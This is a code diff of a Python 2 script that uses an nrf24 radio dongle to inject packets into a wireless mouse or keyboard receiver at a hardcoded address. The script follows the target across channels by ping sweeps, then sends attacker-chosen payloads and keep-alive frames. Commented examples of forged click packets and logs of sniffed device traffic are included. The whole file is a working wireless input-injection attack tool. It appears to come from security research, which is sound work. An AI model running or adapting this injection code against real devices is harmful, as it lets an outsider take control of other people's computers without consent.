@@ -1,38 +1,79 @@
 #!/usr/bin/env python
 
-import sys
-#from lib import common
+import sys, time, array, binascii, logging
 from lib.nrf24 import *
-import logging
-import array
-import binascii
 
 address = '\x07\x16\x91\xc9\x1f'
-channel = int(sys.argv[1])
-print channel
+address_string = ':'.join('{:02X}'.format(ord(b)) for b in address[::-1])
+payload = sys.argv[1]
+#keep_alive = '\x00\x40\x00\x08\xB8'
+#keep_alive = '\x40\x00\x08\xB8\x00\x00\x00\x00\x3B'
+keep_alive = sys.argv[2]
 
 logging.basicConfig(level=10, format='[%(asctime)s.%(msecs)03d]  %(message)s', datefmt="%Y-%m-%d %H:%M:%S")
 
-logging.debug('Using channels {0}'.format(', '.join(str(c) for c in [channel])))
-
 radio = nrf24()
 radio.enable_lna()
-radio.set_channel(channel)
 radio.enter_sniffer_mode(address)
 
-#payload = '\x68\x65\x6C\x6F\x07\x16\x91\xc9\x1f'
-#payload = 'hello'
-# hello == [104, 101, 108, 108, 111]
-# hello == '\x68\x65\x6C\x6F'
+timeout = float(250) / float(1000)
+ping_payload = '\x0F\x0F\x0F\x0F'
 
-# [9, 1, 5, 15, 15, 15, 15, 7, 22, 145, 201, 31]
+ack_timeout = 1
+retries = 5
+last_ping = time.time()
 
-for i in range(0, 1):
-    #print radio.transmit_payload('\x00\x40\x00\x08\xB8', 1, 5)
-    print radio.transmit_payload('\x00\xC2\x02\x00\x00\x00\x00\x00\x00\x3C', 1, 5) # \x02 right click? 0x3C checksum
-    print radio.transmit_payload('\x00\x40\x00\x08\xB8', 1, 5)
-    print radio.transmit_payload('\x00\x40\x00\x08\xB8', 1, 5)
-    print radio.transmit_payload('\x00\xC2\x01\x00\x00\x00\x00\x00\x00\x3D', 1, 5) #works
+def do_stuff():
+  print radio.transmit_payload(payload, 1, 5)
+  print radio.transmit_payload(keep_alive, 1, 5)
+  print radio.transmit_payload(keep_alive, 1, 5)
+  print radio.transmit_payload(keep_alive, 1, 5)
+
+while True:
+  # Follow the target device if it changes channels
+  if time.time() - last_ping > timeout:
+
+    # First try pinging on the active channel
+    if not radio.transmit_payload(ping_payload, ack_timeout, retries):
+
+      # Ping failed on the active channel, so sweep through all available channels
+      success = False
+      for channel_index in range(2, 84):
+        radio.set_channel(channel_index)
+        if radio.transmit_payload(ping_payload, ack_timeout, retries):
+
+          logging.debug('Swapping to channel: {0}'.format(channel_index))
+          for i in range(0, 1):
+            do_stuff()
+          last_ping = time.time()
+          success = True
+          break
+
+      # Ping sweep failed
+      if not success: logging.debug('Unable to ping {0}'.format(address_string))
+
+    # Ping succeeded on the active channel
+    else:
+      logging.debug('Ping success on channel {0}'.format(channel_index))
+      for i in range(0, 1):
+        do_stuff()
+      last_ping = time.time()
+
+  # # Payload checksum
+  # cksum = 0xFF
+  # for n in range(0, len(data)):
+  #   cksum -= data[n]
+  #   cksum += 1
+  # hex(cksum) # '0x3e'
+
+
+# for i in range(0, 1):
+#     #print radio.transmit_payload('\x00\x40\x00\x08\xB8', 1, 5)
+#     # '\x00\xC2\x02\x00\x00\x00\x00\x00\x00\x3C' == payload
+#     print radio.transmit_payload(payload, 1, 5) # \x02 right click? 0x3C checksum
+#     print radio.transmit_payload('\x00\x40\x00\x08\xB8', 1, 5)
+#     print radio.transmit_payload('\x00\x40\x00\x08\xB8', 1, 5)
+#     print radio.transmit_payload('\x00\xC2\x01\x00\x00\x00\x00\x00\x00\x3D', 1, 5) #works
 
     # Interesting packets
     #[2016-03-03 16:03:59.426]  44  10  1F:C9:91:16:07  00:C2:00:00:00:00:00:00:00:3E
@@ -59,3 +100,6 @@ for i in range(0, 1):
     # [2016-03-03 16:33:55.642]   8  22  1F:C9:91:16:07  00:40:00:08:B8:00:00:00:00:98:A6:59:56:39:00:00:00:00:00:00:00:CE
     # [2016-03-03 16:33:55.650]   8  10  1F:C9:91:16:07  00:4F:00:01:18:00:00:00:00:98
     # [2016-03-03 16:33:55.651]   8  10  1F:C9:91:16:07  00:40:00:08:B8:0B:75:3E:E0:AE
+
+    # [2016-03-04 21:39:33.315]  17  10  1F:C9:91:16:07  00:4F:03:00:00:00:00:00:00:AE
+    # [2016-03-04 21:39:33.316]  17  10  1F:C9:91:16:07  00:40:01:18:A7:BD:ED:65:8B:A7
